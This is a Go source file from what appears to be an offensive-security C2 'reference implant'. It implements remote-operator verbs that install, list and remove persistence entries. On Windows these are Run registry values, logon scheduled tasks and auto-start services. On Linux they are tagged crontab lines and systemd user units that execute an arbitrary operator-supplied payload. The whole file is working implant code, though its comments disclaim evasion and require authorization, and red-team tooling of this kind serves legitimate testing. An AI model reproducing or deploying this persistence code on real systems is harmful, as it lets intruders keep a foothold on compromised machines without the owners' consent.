package exec

// persist.go holds the persist.* verbs the reference implant advertises
// (architecture.md Sec 10.1, ADR 0004). They cover the documented persistence
// surfaces every system administrator and offensive-security curriculum
// describes: on Windows the Run registry key, scheduled tasks, and services;
// on Linux cron and systemd user units. Install, list, and remove round-trip
// against these surfaces. Novel or stealth persistence techniques remain
// out-of-tree (ADR 0004).
//
// Argument shape, shared by install and remove:
//
//	persist.install <mechanism> <name> <payload>
//	persist.remove   <mechanism> <name>
//	persist.list     [<mechanism>]
//
// where mechanism is one of runkey, schtasks, service (Windows) or cron,
// systemd (Linux). The <name> identifies the entry so remove can target it;
// for runkey it is the registry value name, for schtasks the task name, for
// service the service name, for cron an arbitrary tag this handler stashes in
// a comment alongside the line, and for systemd the unit basename (without the
// .service suffix).
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior beyond installing or removing the
// requested entry (RESPONSIBLE-USE.md, architecture.md Sec 7). The operator is
// responsible for targeting only systems they are authorized to test.

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/cw/rod/implant/rodpb"
)

// persistMechanisms is the documented set, in the order persist.list reports.
var persistMechanisms = []string{"runkey", "schtasks", "service", "cron", "systemd"}

// persistInstall installs a documented persistence entry. The mechanism decides
// the channel; the platform decides which mechanisms are available. A mechanism
// that does not apply on the current OS reports Failed with a clear cause
// rather than silently no-opping.
func (r *Runner) persistInstall(ctx context.Context, arguments string) (rodpb.TaskOutcome, string) {
	mechanism, name, payload, ok := parsePersistInstallArgs(arguments)
	if !ok {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"persist.install expects '<mechanism> <name> <payload>'"
	}
	if ctx.Err() != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, ctx.Err().Error()
	}

	switch mechanism {
	case "runkey", "schtasks", "service":
		if runtime.GOOS != "windows" {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"persist.install " + mechanism + " is a Windows-only mechanism; not supported on " + runtime.GOOS
		}
		return persistInstallWindows(ctx, mechanism, name, payload)
	case "cron", "systemd":
		return persistInstallLinux(ctx, mechanism, name, payload)
	default:
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"persist.install: unknown mechanism '" + mechanism + "' (expected one of " + strings.Join(persistMechanisms, ", ") + ")"
	}
}

// persistRemove reverses a persist.install for the same mechanism and name. It
// tolerates an already-absent entry as Succeeded (idempotent cleanup) so a
// retry after a partial install does not strand the operator on a Failed.
func (r *Runner) persistRemove(ctx context.Context, arguments string) (rodpb.TaskOutcome, string) {
	mechanism, name, ok := parsePersistRemoveArgs(arguments)
	if !ok {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"persist.remove expects '<mechanism> <name>'"
	}
	if ctx.Err() != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, ctx.Err().Error()
	}

	switch mechanism {
	case "runkey", "schtasks", "service":
		if runtime.GOOS != "windows" {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"persist.remove " + mechanism + " is a Windows-only mechanism; not supported on " + runtime.GOOS
		}
		return persistRemoveWindows(ctx, mechanism, name)
	case "cron", "systemd":
		return persistRemoveLinux(ctx, mechanism, name)
	default:
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"persist.remove: unknown mechanism '" + mechanism + "' (expected one of " + strings.Join(persistMechanisms, ", ") + ")"
	}
}

// persistList enumerates the installed entries across the documented mechanisms
// the current platform supports, one line per entry as "<mechanism> <name>".
// An optional argument filters to a single mechanism. The output is a listing;
// no payloads are dumped (a Run key's command, a unit's ExecStart) since the
// operator can read them with the host's own tools once they know the names.
func (r *Runner) persistList(_ context.Context, arguments string) (rodpb.TaskOutcome, string) {
	filter := strings.TrimSpace(arguments)
	if filter != "" && !isKnownMechanism(filter) {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"persist.list: unknown mechanism '" + filter + "' (expected one of " + strings.Join(persistMechanisms, ", ") + ")"
	}

	var lines []string
	windows := runtime.GOOS == "windows"
	for _, m := range persistMechanisms {
		if filter != "" && m != filter {
			continue
		}
		isWindowsMech := m == "runkey" || m == "schtasks" || m == "service"
		if isWindowsMech != windows {
			continue
		}
		names, err := persistListMechanism(m)
		if err != nil {
			// Listing one mechanism failing does not sink the whole report;
			// note it and continue so the operator still sees the others.
			lines = append(lines, fmt.Sprintf("%s (listing failed: %s)", m, err.Error()))
			continue
		}
		for _, n := range names {
			lines = append(lines, m+" "+n)
		}
	}
	if len(lines) == 0 {
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "(no entries)"
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.Join(lines, "\n")
}

// parsePersistInstallArgs splits "<mechanism> <name> <payload...>" into the
// three parts. The payload keeps its internal whitespace; only the first two
// tokens are the mechanism and name. Returns ok=false when fewer than three
// fields are present (the payload itself may be multi-word).
func parsePersistInstallArgs(arguments string) (mechanism, name, payload string, ok bool) {
	fields := strings.Fields(arguments)
	if len(fields) < 3 {
		return "", "", "", false
	}
	return fields[0], fields[1], strings.Join(fields[2:], " "), true
}

// parsePersistRemoveArgs splits "<mechanism> <name>" into the two parts.
// Returns ok=false when the field count is not exactly two.
func parsePersistRemoveArgs(arguments string) (mechanism, name string, ok bool) {
	fields := strings.Fields(arguments)
	if len(fields) != 2 {
		return "", "", false
	}
	return fields[0], fields[1], true
}

// isKnownMechanism reports whether m is one of the documented mechanisms.
func isKnownMechanism(m string) bool {
	for _, known := range persistMechanisms {
		if m == known {
			return true
		}
	}
	return false
}

// --- Windows mechanisms -----------------------------------------------------

// persistInstallWindows installs a Run registry value, a scheduled task, or a
// service. It uses the built-in reg / schtasks / sc tooling so the install
// goes through the same documented administration channels an operator would
// use by hand, keeping the OPSEC surface of a reference implant honest.
func persistInstallWindows(ctx context.Context, mechanism, name, payload string) (rodpb.TaskOutcome, string) {
	switch mechanism {
	case "runkey":
		// HKCU Run key; the per-user autorun surface every Windows admin guide
		// documents. reg add writes the value.
		out, err := exec.CommandContext(ctx, "reg", "add",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", name, "/t", "REG_SZ", "/d", payload, "/f").CombinedOutput()
		if err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install runkey " + name + ": " + appendIfMissing(string(out), err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
			"installed runkey " + name + " -> " + payload
	case "schtasks":
		out, err := exec.CommandContext(ctx, "schtasks", "/create",
			"/tn", name, "/tr", payload, "/sc", "onlogon", "/f").CombinedOutput()
		if err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install schtasks " + name + ": " + appendIfMissing(string(out), err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
			"installed schtasks " + name + " -> " + payload
	case "service":
		// sc create registers the service; binPath= is the payload. Note the
		// space after the flag name is required by sc's quirky argv handling.
		out, err := exec.CommandContext(ctx, "sc", "create", name,
			"binPath=", payload, "start=", "auto").CombinedOutput()
		if err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install service " + name + ": " + appendIfMissing(string(out), err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
			"installed service " + name + " -> " + payload
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "persist.install: unreachable mechanism " + mechanism
}

// persistRemoveWindows reverses install for the three Windows mechanisms. An
// absent entry is reported Succeeded so retries after partial installs clean
// up rather than strand the operator.
func persistRemoveWindows(ctx context.Context, mechanism, name string) (rodpb.TaskOutcome, string) {
	switch mechanism {
	case "runkey":
		out, err := exec.CommandContext(ctx, "reg", "delete",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", name, "/f").CombinedOutput()
		combined := string(out)
		// reg delete prints "ERROR: The system was unable to find the specified
		// registry key." when the value is already gone; treat that as success.
		if err != nil && strings.Contains(strings.ToLower(combined), "unable to find") {
			return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed runkey " + name + " (already absent)"
		}
		if err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"remove runkey " + name + ": " + appendIfMissing(combined, err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed runkey " + name
	case "schtasks":
		out, err := exec.CommandContext(ctx, "schtasks", "/delete", "/tn", name, "/f").CombinedOutput()
		combined := string(out)
		if err != nil && strings.Contains(strings.ToLower(combined), "does not exist") {
			return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed schtasks " + name + " (already absent)"
		}
		if err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"remove schtasks " + name + ": " + appendIfMissing(combined, err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed schtasks " + name
	case "service":
		out, err := exec.CommandContext(ctx, "sc", "delete", name).CombinedOutput()
		combined := string(out)
		if err != nil && strings.Contains(strings.ToLower(combined), "does not exist") {
			return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed service " + name + " (already absent)"
		}
		if err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"remove service " + name + ": " + appendIfMissing(combined, err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed service " + name
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "persist.remove: unreachable mechanism " + mechanism
}

// persistListMechanism dispatches the per-mechanism listing on the current
// platform. Callers guard the Windows/Linux split, so this only sees the
// mechanism on its native OS.
func persistListMechanism(mechanism string) ([]string, error) {
	switch runtime.GOOS {
	case "windows":
		return persistListWindows(mechanism)
	default:
		return persistListLinux(mechanism)
	}
}

// persistListWindows enumerates the installed entries for one Windows
// mechanism by parsing the output of reg query / schtasks /query / sc query.
func persistListWindows(mechanism string) ([]string, error) {
	switch mechanism {
	case "runkey":
		out, err := exec.Command("reg", "query",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).CombinedOutput()
		if err != nil {
			return nil, err
		}
		return parseRegValueNames(string(out)), nil
	case "schtasks":
		out, err := exec.Command("schtasks", "/query", "/fo", "csv", "/nh").CombinedOutput()
		if err != nil {
			return nil, err
		}
		return parseCsvFirstColumn(string(out)), nil
	case "service":
		out, err := exec.Command("sc", "query", "type=", "service", "state=", "all").CombinedOutput()
		if err != nil {
			return nil, err
		}
		return parseScServiceNames(string(out)), nil
	}
	return nil, fmt.Errorf("unknown mechanism %s", mechanism)
}

// parseRegValueNames pulls the value names out of `reg query` output, which
// prints them four-space-indented under the key path. Lines carrying the key
// path, the default value, or blank lines are skipped.
func parseRegValueNames(out string) []string {
	var names []string
	for _, line := range strings.Split(out, "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "HKEY_") {
			continue
		}
		// The default value prints as "(Default)    REG_SZ    ..."; skip it.
		if trimmed == "(Default)" || strings.HasPrefix(trimmed, "(Default)") {
			continue
		}
		// Value lines look like "RodRun    REG_SZ    cmd /c echo hi" -- take
		// the first token as the name.
		fields := strings.Fields(trimmed)
		if len(fields) >= 2 {
			names = append(names, fields[0])
		}
	}
	return names
}

// parseCsvFirstColumn takes the first column of `schtasks /query /fo csv /nh`
// output, stripping the quotes. The first column is the task name; folder
// backslashes are kept as schtasks prints them.
func parseCsvFirstColumn(out string) []string {
	var names []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// CSV: "Name","Next Run Time","Status",... -- pull the first field.
		comma := strings.Index(line, ",")
		if comma < 0 {
			continue
		}
		first := strings.Trim(line[:comma], "\"")
		// Skip the header-ish placeholder schtasks emits for empty folders.
		if first == "" || strings.EqualFold(first, "TaskName") {
			continue
		}
		// schtasks prints folder separators as \Folder\ -> drop the leading
		// backslash folder markers so only real task names survive.
		if first == "\\" {
			continue
		}
		names = append(names, first)
	}
	return names
}

// parseScServiceNames pulls SERVICE_NAME values out of `sc query` output.
func parseScServiceNames(out string) []string {
	var names []string
	for _, line := range strings.Split(out, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(strings.ToUpper(trimmed), "SERVICE_NAME:") {
			name := strings.TrimSpace(trimmed[len("SERVICE_NAME:"):])
			if name != "" {
				names = append(names, name)
			}
		}
	}
	return names
}

// --- Linux mechanisms -------------------------------------------------------

// persistInstallLinux installs a cron line or a systemd user unit. For cron
// the payload is appended to the per-user crontab with a Rod marker comment so
// remove can target it by name; for systemd a per-user unit file is written and
// daemon-reload invoked.
func persistInstallLinux(ctx context.Context, mechanism, name, payload string) (rodpb.TaskOutcome, string) {
	switch mechanism {
	case "cron":
		// Read the current crontab (empty if none), append a tagged line, and
		// write it back through crontab -. The tag comment lets remove find it
		// without parsing the crontab grammar.
		current := readCrontab()
		marker := "# Rod:" + name
		if hasCronLine(current, marker) {
			return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
				"installed cron " + name + " (already present)"
		}
		updated := current + marker + "\n" + payload + "\n"
		if err := writeCrontab(ctx, updated); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install cron " + name + ": " + err.Error()
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
			"installed cron " + name + " -> " + payload
	case "systemd":
		// Per-user unit under ~/.config/systemd/user/, then a daemon-reload so
		// the new unit is picked up. The name is the unit basename (without
		// .service).
		dir := systemdUserDir()
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install systemd " + name + ": mkdir: " + err.Error()
		}
		path := filepath.Join(dir, name+".service")
		unit := systemdUnit(name, payload)
		if err := os.WriteFile(path, []byte(unit), 0o644); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install systemd " + name + ": write: " + err.Error()
		}
		if out, err := exec.CommandContext(ctx, "systemctl", "--user", "daemon-reload").CombinedOutput(); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"install systemd " + name + ": daemon-reload: " + appendIfMissing(string(out), err.Error())
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
			"installed systemd " + name + " -> " + path
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "persist.install: unreachable mechanism " + mechanism
}

// persistRemoveLinux reverses install for the two Linux mechanisms. Like the
// Windows path, an already-absent entry is reported Succeeded.
func persistRemoveLinux(ctx context.Context, mechanism, name string) (rodpb.TaskOutcome, string) {
	switch mechanism {
	case "cron":
		current := readCrontab()
		if !hasCronLine(current, "# Rod:"+name) {
			return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
				"removed cron " + name + " (already absent)"
		}
		updated := removeCronBlock(current, name)
		if err := writeCrontab(ctx, updated); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"remove cron " + name + ": " + err.Error()
		}
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed cron " + name
	case "systemd":
		path := filepath.Join(systemdUserDir(), name+".service")
		if _, err := os.Stat(path); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
				"removed systemd " + name + " (already absent)"
		}
		if err := os.Remove(path); err != nil {
			return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
				"remove systemd " + name + ": " + err.Error()
		}
		_ = exec.CommandContext(ctx, "systemctl", "--user", "daemon-reload").Run()
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "removed systemd " + name
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "persist.remove: unreachable mechanism " + mechanism
}

// persistListLinux enumerates the installed entries for one Linux mechanism.
func persistListLinux(mechanism string) ([]string, error) {
	switch mechanism {
	case "cron":
		return listCronNames(readCrontab()), nil
	case "systemd":
		entries, err := os.ReadDir(systemdUserDir())
		if err != nil {
			// An absent user dir means no units installed -- not an error.
			if os.IsNotExist(err) {
				return nil, nil
			}
			return nil, err
		}
		var names []string
		for _, e := range entries {
			if n := strings.TrimSuffix(e.Name(), ".service"); n != e.Name() {
				names = append(names, n)
			}
		}
		return names, nil
	}
	return nil, fmt.Errorf("unknown mechanism %s", mechanism)
}

// readCrontab returns the current per-user crontab as a string, or "" if none
// is installed or crontab is unavailable. Failures here are treated as
// "empty crontab" so install proceeds with a clean append and list reports
// nothing rather than erroring the whole verb.
func readCrontab() string {
	out, err := exec.Command("crontab", "-l").CombinedOutput()
	if err != nil {
		return ""
	}
	// crontab -l prints a "no crontab for <user>" message on stderr to some
	// shells; treat that as empty.
	lower := strings.ToLower(string(out))
	if strings.Contains(lower, "no crontab for") {
		return ""
	}
	return string(out)
}

// writeCrontab installs the given crontab body via `crontab -`, which reads
// the new contents from stdin.
func writeCrontab(ctx context.Context, body string) error {
	cmd := exec.CommandContext(ctx, "crontab", "-")
	cmd.Stdin = strings.NewReader(body)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %s", err.Error(), strings.TrimSpace(string(out)))
	}
	return nil
}

// hasCronLine reports whether the crontab body already contains the given Rod
// marker, so install is idempotent and remove can detect absence.
func hasCronLine(crontab, marker string) bool {
	for _, line := range strings.Split(crontab, "\n") {
		if strings.TrimSpace(line) == marker {
			return true
		}
	}
	return false
}

// removeCronBlock strips the marker comment and the single payload line that
// follows it from the crontab body. Used by remove to delete exactly the entry
// install wrote.
func removeCronBlock(crontab, name string) string {
	marker := "# Rod:" + name
	lines := strings.Split(crontab, "\n")
	var kept []string
	for i := 0; i < len(lines); i++ {
		if strings.TrimSpace(lines[i]) == marker {
			// Skip the marker and the payload line install wrote after it.
			i++ // skip payload
			continue
		}
		kept = append(kept, lines[i])
	}
	return strings.Join(kept, "\n")
}

// listCronNames parses the Rod markers out of the crontab body to recover the
// names install recorded. Markers look like "# Rod:<name>".
func listCronNames(crontab string) []string {
	var names []string
	for _, line := range strings.Split(crontab, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "# Rod:") {
			names = append(names, strings.TrimPrefix(trimmed, "# Rod:"))
		}
	}
	return names
}

// systemdUserDir is the per-user systemd unit directory this handler writes
// into. XDG_CONFIG_HOME is honored when set; otherwise ~/.config is used.
func systemdUserDir() string {
	if xdg := os.Getenv("XDG_CONFIG_HOME"); xdg != "" {
		return filepath.Join(xdg, "systemd", "user")
	}
	home, err := os.UserHomeDir()
	if err != nil {
		home = "."
	}
	return filepath.Join(home, ".config", "systemd", "user")
}

// systemdUnit renders a minimal per-user service unit for the given name and
// payload. The payload becomes ExecStart; everything else is the documented
// minimum systemd expects for a user service.
func systemdUnit(name, payload string) string {
	return strings.Join([]string{
		"[Unit]",
		"Description=Rod-installed unit " + name,
		"",
		"[Service]",
		"ExecStart=" + payload,
		"Restart=no",
		"",
		"[Install]",
		"WantedBy=default.target",
		"",
	}, "\n")
}
